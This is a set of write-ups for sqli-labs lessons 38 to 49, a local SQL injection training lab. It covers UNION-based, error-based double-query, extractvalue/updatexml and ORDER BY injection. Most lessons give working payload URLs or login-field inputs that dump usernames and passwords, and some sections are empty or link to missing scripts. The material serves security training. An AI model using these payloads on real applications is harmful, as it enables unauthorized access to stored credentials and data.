# Chapter-12

This section will contain write-ups for the ```Stacked Injections``` section of sqli-labs. 

## Lesson 38

This is a rather simple challenge. 

The url for this challenge is as follows -

```
http://localhost/sqlilabs/Less-38/?id=-1' union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

:star2: Yaaaaay! This was the last challenge in the advanced section of ```sqli-labs```. 

## Lesson 39 

A simple challenge. Sql injection can be performed directly without breaking the query. 

The url for the same will look somewhat like this - 

```
http://localhost/sqlilabs/Less-39/?id=-1 union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

## Lesson 40 

A simple blind injection challenge. On breaking the query with a ```'```, the website does not show any error message. Hence, we have to guess and fix the query. 

The url for this challenge is shown below - 

```
http://localhost/sqlilabs/Less-40/?id=-3') union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

## Lesson 41

This is also a blind injection challenge. We might skip the obvious here. 

We can get the data by performing a direct injection without breaking the query. 

The url for the same is shown below - 

```
http://localhost/sqlilabs/Less-41/?id=-3 union select 1, group_concat(username), group_concat(password) from users limit 0, 1 --+
```

## Lesson 42

This one is a bit tricky. 

Here both ```Forgot your password``` and ```Add New User``` options have been disabled. This sort of prevents us from using ```Second Order SQL Injection```.

On fuzzing the website, we find that the ```password field``` in the login page is vulnerable to sql injections. On passing ```'``` to the password field, the webpage shows a new page with an error message. 

Since, we are able to see the error message in the resulting webpage, we can use ```Double SQL Injection```.

On passing the below payload into the password, we get the name of the database being used - 

```sql 
admin' and (select 1 from (select count(*), concat((select database()), "::", floor(rand()*2), "::") as hack from information_schema.tables group by hack) as payload) #
```

On further modifying the above payload, we can get the usernames and passwords of all users - 

```sql
admin' and (select 1 from (select count(*), concat((select username from users limit 0, 1), "::", floor(rand()*2), "::") as hack from information_schema.tables group by hack) as payload)#
```

:warning: If you see the following error ```Subquery returns more than 1 row```, you'll just have to run the same query multiple times. 

:boom: Also, you will have change the limit offset in the above query to enumerate the rest of the usernames.

## Lesson 43

This challenge is similar to the previous challenge. Here making a minor change to the payload breaks the query.  

In this challenge, the password field is vulnerable just like in the previous challenge.  

Passing ```admin')``` breaks the query. The query can also be broken by passing just a ```'```.

The query can be patched by passing ```admin') #``` to the password field. 

Entering the below mentioned queries in the password field will yield the result - 

```sql
admin') and (select 1 from (select count(*), concat((select database()), "::", floor(rand()*2), "::") as hack from information_schema.tables group by hack) as payload) #
```

```sql
admin') and (select 1 from (select count(*), concat((select username from users limit 0, 1), "::", floor(rand()*2), "::") as hack from information_schema.tables group by hack) as payload)#
```
:warning: If you see the following error ```Subquery returns more than 1 row```, you'll just have to run the same query multiple times. 

:boom: Also, you will have change the limit offset in the above query to enumerate the rest of the usernames.

## Lesson 44 

This challenge is similar to lesson-43 and lesson-42. The only difference is that no error messages are being displayed when the query is broken. This indicates that we may have to resort to blind sql injection. 

We can get to the conclusion that this challenge can be solved with blind injection by doing the following - 

1.  Sign in as admin with the password as ```admin')```.
1.  This breaks the query and we are presented with a new webpage without any errors. 
1.  Now, again login as admin with the password as ```admin') #```.
1.  We are able to login sucessfully.

Thus we can conclude that, this challenge can be solved with blind injection. 

Now, this would require us to write a custom script that will enumerate all the entries in the database.

The script can be found [here](#).

We'll have to use time-based blind injection here as on logging-in the user is re-directed to a different page. 

## Lesson 45


## Exploiting SQLi in an ORDER BY clause

> The **ORDER BY** keyword is used to sort the result-set in ascending or descending order.

Please have a look at these websites - [1](https://support.portswigger.net/customer/en/portal/articles/2590771-sql-injection-in-the-query-structure), [2](https://www.notsosecure.com/injection-in-order-by-clause/), [3](http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html)

> Exploiting SQL injection in an ORDER BY clause is significantly different from most other cases. A database will not accept a UNION, WHERE, OR, or AND keyword at this point in the query.

> Here exploitation requires the attacker to specify a nested query in place of the ORDER BY parameter identified above.

> The vulnerable query allows you to test a single piece of information (e.g. a single string character) from anywhere in the database in a boolean query.

> We inject an input that will allow us to infer whether or not the first character of the target is a particular character. If it is, the list will be returned sorted by particular column. If not, it will be returned sorted by a different column.

This is similar to blind sql injection with the only difference being the manner in which we infer true or false. Here we can infer true or false based on how the output list is being sorted.  

:warning: If we are able to see an error message when we break the query, we can use double query injection to dump the data. If we are unable to see any error messages, we then have to proceed with blind sql injection.

## Lesson 46

We see a simple list when 3 is passed as a parameter to the get request.

Our intention is to some how gain access to the whole database.

When ```'``` is added to the get parameter value, we see an error. This can be exploited. 

As discussed in the above section, we cannot use ```UNION```, ```WHERE```, ```OR``` or ```AND``` keywords. Thus, we have to resort to double query injections. 

We can make use any of the three methods discussed in [Chapter-04]().

The query will look somewhat like this - 

```
http://localhost/sqlilabs/Less-46/?sort=3 and (select 1 from (select count(*), concat((select database()), "::", floor(rand()*2), "::") as hack from information_schema.tables group by hack) as payload) --+
```

or 

```
http://localhost/sqlilabs/Less-46/?sort=3 and extractvalue(null, concat("::", (select database()), "::")) --+
```

or 

```
http://localhost/sqlilabs/Less-46/?sort=3 and updatexml(null, concat("::", (select database()), "::"), null) --+
```

The above query can be further manipulated to get the required data from the database.

## Lesson 47

This challenge is quite similar to the previous challenge.

The url for this challenge will look somehwat like this - 

```
http://localhost/sqlilabs/Less-47/?sort=3' and extractvalue(null, concat("::", (select database()), "::")) --+
```

The above url can be further manipulated to get the required data from the database.

## Lesson 48

On fuzzing the url, we get to know that this challenge is based on blind sql injection as we are not able to see any error message when we try to break the query. 

This challenge will have to be solved with the help of a script. 

The script can be found [here](#).

## Lesson 49

